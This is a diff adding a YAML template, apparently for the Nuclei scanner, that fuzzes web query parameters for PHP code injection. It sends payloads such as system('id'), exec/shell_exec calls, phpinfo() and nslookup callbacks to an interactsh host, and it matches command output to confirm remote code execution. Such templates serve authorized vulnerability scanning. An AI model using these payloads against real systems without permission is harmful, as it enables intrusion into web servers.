@@ -1,0 +1,55 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: multiple
+    part: query
+    type: replace
+  matchers:
+  - condition: and
+    type: word
+    words:
+    - uid=
+    - gid=
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  - type: word
+    words:
+    - PHP Version
+  - type: word
+    words:
+    - This is perl
+  matchers-condition: or
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    rce:
+    - '''.system(''id'').'''
+    - '''.system(''perl -v'').'''
+    - '%20%7b$%7bphpinfo()%7d%7d'
+    - <?php exec("id"); ?>
+    - <?php system("id"); ?>
+    - <?php shell_exec("id"); ?>
+    - <?php escapeshellcmd("id"); ?>
+    - gethostbyname('{{interactsh-url}}');
+    - s:19:"<?php phpinfo(); ?>";
+    - $(exec('nslookup {{interactsh-url}}'))
+    - ${'{{interactsh-url}}'.resolve}
+    - ${resolve({{'interactsh-url'}})}
+    - ${dns({{'interactsh-url'}})}
+  redirects: true
+  stop-at-first-match: true
+id: php-code-injection
+info:
+  author: reewardius
+  name: PHP Code Injection
+  reference:
+  - https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
+  - https://medium.com/@jonathanbouman/remote-code-execution-at-ws1-aholdusa-com-compromising-logins-of-ahold-delhaize-usa-employees-c7c9aca7e05d
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req,dast
